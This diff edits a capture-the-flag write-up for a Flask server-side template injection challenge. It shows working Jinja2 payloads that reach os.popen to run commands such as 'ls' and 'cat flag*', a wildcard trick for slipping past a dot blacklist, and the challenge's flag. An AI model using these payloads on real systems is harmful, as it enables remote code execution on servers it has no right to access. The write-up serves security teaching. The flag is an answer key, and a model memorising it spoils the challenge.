@@ -55,9 +55,9 @@ This challenge involves a Server-Side Template Injection vulnerability.
    - `{{7*7}}` - This should render as 49 if the SSTI vulnerability exists
    - `{{config}}` - To see the Flask configuration
    - `{{config.items()}}` - To see the configuration as key-value pairs
-   - More advanced payloads can give you remote code execution:
-   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
-   - Or to directly get the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
+   - More advanced payloads can give you remote code execution: `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
+   - Or to directly get the part 1/2 of the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
+   - Then get the 2/2 of the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag*')['read']()}}`. We use wildcard `*` to bypass blacklisted dot `.`.
 
 3. The flag is: `ETHACK{es_es_ti_ai_ahayahay}`
 </details>
